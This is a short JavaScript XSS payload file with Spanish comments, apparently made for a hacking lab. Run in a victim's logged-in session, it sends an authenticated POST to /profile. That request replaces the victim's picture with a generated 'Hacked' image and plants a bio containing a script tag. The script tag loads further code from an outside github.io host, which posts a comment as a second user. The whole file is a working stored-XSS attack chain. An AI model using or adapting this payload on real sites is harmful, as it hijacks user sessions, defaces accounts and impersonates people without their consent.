// payload.js - XSS Chain Corregida: Actualiza pic/bio de Pepe + carga script externo para comentario de Jeni
// FIX: En xss2, usa <script src=""> para cargar jeni-comment.js (envía comentario como Jeni)

// Crea canvas para imagen "Hacked"
var canvas = document.createElement('canvas');
canvas.width = 150;
canvas.height = 150;
var ctx = canvas.getContext('2d');
ctx.fillStyle = 'black';
ctx.fillRect(0, 0, 150, 150);
ctx.fillStyle = 'red';
ctx.font = 'bold 30px sans-serif';
ctx.fillText('Hacked', 20, 85);

// XSS2 para bio: Carga script externo para POST comentario como Jeni
var xss2 = '<script src="https://iktomy87.github.io/payload-jeni/jeni.js"></script> <p>Curiosidad + código = poder. Experto en Ciberseguridad. (Actualizado por hacklab)</p>';

// Convertir canvas a Blob y enviar update a /profile
canvas.toBlob(function(blob) {
  var formData = new FormData();
  formData.append('bio', xss2);
  formData.append('profile_pic', blob, 'hacked.jpg');
  
  fetch('/profile', {
    method: 'POST',
    credentials: 'include',
    body: formData
  }).then(r => {
    if (r.ok) {
      console.log('✅ Perfil de Pepe hackeado: Pic + Bio actualizados con script de Jeni');
    } else {
      console.error('❌ Error en POST a /profile:', r.status);
    }
  }).catch(err => console.error('Error en fetch:', err));
}, 'image/jpeg');
